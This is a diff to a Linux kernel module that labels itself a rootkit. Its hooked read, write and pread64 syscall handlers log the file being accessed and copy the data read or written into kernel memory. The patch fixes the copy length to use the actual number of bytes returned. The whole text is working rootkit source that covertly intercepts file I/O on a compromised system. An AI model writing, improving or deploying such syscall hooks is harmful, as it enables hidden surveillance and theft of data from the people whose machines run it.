@@ -71,12 +71,12 @@ SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __use
     pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
     kvfree(s_pathname);
 
-    s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);
+    s_data = (char *)kvmalloc(l_ret + 1, GFP_KERNEL);
 
     if (s_data == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
     } else {
-        l_err = strncpy_from_user(s_data, s_buf, sz_count);
+        l_err = strncpy_from_user(s_data, s_buf, l_ret);
 
         if (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
@@ -112,12 +112,12 @@ SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const ch
     pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
     kvfree(s_pathname);
 
-    s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);
+    s_data = (char *)kvmalloc(l_ret + 1, GFP_KERNEL);
 
     if (s_data == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
     } else {
-        l_err = strncpy_from_user(s_data, s_buf, sz_count);
+        l_err = strncpy_from_user(s_data, s_buf, l_ret);
 
         if (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
@@ -177,12 +177,12 @@ SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char
     pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
     kvfree(s_pathname);
 
-    s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);
+    s_data = (char *)kvmalloc(l_ret + 1, GFP_KERNEL);
 
     if (s_data == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
     } else {
-        l_err = strncpy_from_user(s_data, s_buf, sz_count);
+        l_err = strncpy_from_user(s_data, s_buf, l_ret);
 
         if (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
